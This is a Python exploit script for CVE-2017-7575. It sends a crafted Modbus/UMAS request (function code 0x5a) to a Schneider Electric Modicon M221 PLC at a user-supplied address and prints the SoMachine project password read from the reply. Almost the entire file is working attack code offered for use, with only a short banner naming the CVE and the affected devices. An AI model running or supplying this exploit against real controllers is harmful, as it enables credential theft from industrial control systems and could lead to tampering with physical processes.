# -*- coding: utf-8 -*-
import socket
import sys

mbIP    = sys.argv[1]
mbPort  = sys.argv[2]
SID     = sys.argv[3]

details = '''
 [+] Title: Error en mecanismo de autenticación .
 [+] Vendor: Schneider Electric
 [+] cve: CVE-2017-7575
 [+] Devices vuls:
    [*] Schneider-Electric Modicon TM221CE16R 1.3.3.3
    [*] Schneider Modicon M221 PLC todas las versiones firmware hasta la versión v1.5.0.1
    [*] SoMachine Basic todas las versiones software hasta la versión v1.5

Powered by: @_IndustrialArmy

'''
class Colors:
    BLUE        = '\033[94m'
    GREEN       = '\033[32m'
    RED         = '\033[0;31m'
    DEFAULT     = '\033[0m'
    ORANGE      = '\033[33m'
    WHITE       = '\033[97m'
    BOLD        = '\033[1m'
    BR_COLOUR   = '\033[1;37;40m'

print Colors.BLUE+details+Colors.DEFAULT

# --MBAP --------------------------------------------------------  #
# Return a string with the modbus header
def create_header_modbus(length,unit_id):
    trans_id = "4462"
    proto_id = "0000"
    protoLen = length.zfill(4)
    unit_id  = unit_id

    return trans_id + proto_id + protoLen + unit_id.zfill(2)


def cve_2017_7575():
    modbusRequest =     create_header_modbus('5',SID)
    modbusRequest +=    '5a' # function code # (UMAS)
    modbusRequest +=    '000300' # 


    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print "\n [!] IP: "+str(mbIP)
    print " [!] Port: "+str(mbPort)

    client.connect((mbIP,int(mbPort)))
    client.send( modbusRequest.decode("hex") )
    modResponse = client.recv(2048)
    client.close()

    return (modResponse.encode('hex'))[90:-20].decode("hex")

getPasswd = cve_2017_7575()

print Colors.GREEN+"\n Password of Proyect (SoMachine): \t\n [>]\t"+Colors.ORANGE+(getPasswd)+Colors.DEFAULT
print "\n"
